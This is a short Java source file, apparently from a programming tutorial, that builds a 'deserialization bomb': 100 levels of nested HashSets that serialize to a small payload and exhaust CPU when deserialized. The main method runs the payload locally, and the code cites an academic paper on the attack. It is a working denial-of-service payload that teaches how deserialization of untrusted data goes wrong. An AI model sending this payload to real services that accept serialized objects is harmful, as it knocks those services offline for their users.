package com.mkyong.io.object.serialization;

import com.mkyong.io.utils.SerializeUtil;

import java.util.HashSet;
import java.util.Set;

//https://homepages.ecs.vuw.ac.nz/~alex/files/DietrichJezekRasheedTahirPotaninECOOP2017.pdf
public class DeserializationBomb {

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        SerializeUtil.deserialize(bomb());  // Dos here
        System.out.println("Done");
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("test-" + i); // make it not equal to t2

            s1.add(t1); // root also add set
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);

            s1 = t1;    // reference to t1, so that `root` can add new set from the last t1
            s2 = t2;
        }
        return SerializeUtil.serialize(root);
    }

}
